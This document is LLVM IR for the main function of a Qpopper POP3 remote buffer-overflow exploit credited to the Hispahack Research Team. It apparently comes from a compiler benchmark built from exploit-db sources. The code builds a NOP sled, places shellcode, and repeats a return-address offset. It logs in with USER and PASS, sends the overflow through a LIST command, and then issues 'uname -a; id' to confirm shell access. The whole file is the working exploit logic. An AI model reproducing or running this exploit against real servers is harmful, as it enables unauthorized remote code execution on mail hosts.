; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19729.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19729.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFERSIZE = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [53 x i8] c"\0A!Hispahack Research Team (http://hispahack.ccc.de)\0A\00", align 1
@.str.1 = private unnamed_addr constant [51 x i8] c"Qpopper xploit by Zhodiac <zhodiac@softhome.net>\0A\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [17 x i8] c"Buffer size: %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"Offset: 0x%lx\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"USER %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"PASS %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"LIST 1 %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"uname -a; id\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @BUFFERSIZE, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %7, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %8, align 8
  %16 = load i64, i64* @OFFSET, align 8
  store i64 %16, i64* %10, align 8
  %17 = load i32, i32* @stderr, align 4
  %18 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* @stderr, align 4
  %20 = call i32 (i32, i8*, ...) @fprintf(i32 %19, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.1, i64 0, i64 0))
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 3
  br i1 %22, label %23, label %28

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @usage(i8* %26)
  br label %28

28:                                               ; preds = %23, %2
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, 4
  br i1 %30, label %31, label %38

31:                                               ; preds = %28
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 3
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @atol(i8* %34)
  %36 = load i64, i64* %10, align 8
  %37 = add i64 %36, %35
  store i64 %37, i64* %10, align 8
  br label %38

38:                                               ; preds = %31, %28
  store i8* %15, i8** %6, align 8
  %39 = load i8*, i8** %6, align 8
  %40 = trunc i64 %13 to i32
  %41 = call i32 @memset(i8* %39, i32 0, i32 %40)
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* @NOP, align 4
  %44 = load i8*, i8** @shellcode, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = sext i32 %45 to i64
  %47 = sub i64 %13, %46
  %48 = sub i64 %47, 16
  %49 = trunc i64 %48 to i32
  %50 = call i32 @memset(i8* %42, i32 %43, i32 %49)
  %51 = load i8*, i8** @shellcode, align 8
  %52 = call i32 @strlen(i8* %51)
  %53 = sext i32 %52 to i64
  %54 = sub i64 %13, %53
  %55 = sub i64 %54, 16
  %56 = load i8*, i8** %6, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 %55
  store i8* %57, i8** %6, align 8
  %58 = load i8*, i8** %6, align 8
  %59 = load i8*, i8** @shellcode, align 8
  %60 = load i8*, i8** @shellcode, align 8
  %61 = call i32 @strlen(i8* %60)
  %62 = call i32 @memcpy(i8* %58, i8* %59, i32 %61)
  %63 = load i8*, i8** @shellcode, align 8
  %64 = call i32 @strlen(i8* %63)
  %65 = load i8*, i8** %6, align 8
  %66 = sext i32 %64 to i64
  %67 = getelementptr inbounds i8, i8* %65, i64 %66
  store i8* %67, i8** %6, align 8
  %68 = load i8*, i8** %6, align 8
  %69 = bitcast i8* %68 to i64*
  store i64* %69, i64** %9, align 8
  store i32 0, i32* %11, align 4
  br label %70

70:                                               ; preds = %77, %38
  %71 = load i32, i32* %11, align 4
  %72 = icmp slt i32 %71, 4
  br i1 %72, label %73, label %80

73:                                               ; preds = %70
  %74 = load i64, i64* %10, align 8
  %75 = load i64*, i64** %9, align 8
  %76 = getelementptr inbounds i64, i64* %75, i32 1
  store i64* %76, i64** %9, align 8
  store i64 %74, i64* %75, align 8
  br label %77

77:                                               ; preds = %73
  %78 = load i32, i32* %11, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %11, align 4
  br label %70

80:                                               ; preds = %70
  %81 = load i64*, i64** %9, align 8
  %82 = bitcast i64* %81 to i8*
  store i8* %82, i8** %6, align 8
  %83 = load i8*, i8** %6, align 8
  store i8 0, i8* %83, align 1
  %84 = load i32, i32* @stderr, align 4
  %85 = call i32 @strlen(i8* %15)
  %86 = call i32 (i32, i8*, ...) @fprintf(i32 %84, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i32 %85)
  %87 = load i32, i32* @stderr, align 4
  %88 = load i64, i64* %10, align 8
  %89 = call i32 (i32, i8*, ...) @fprintf(i32 %87, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i64 %88)
  %90 = load i8**, i8*** %5, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 1
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %92)
  %94 = call i32 @sleep(i32 1)
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 2
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i8* %97)
  %99 = call i32 @sleep(i32 1)
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0), i8* %15)
  %101 = call i32 @sleep(i32 1)
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %103 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %103)
  %104 = load i32, i32* %3, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @usage(i8*) #2

declare dso_local i64 @atol(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @sleep(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
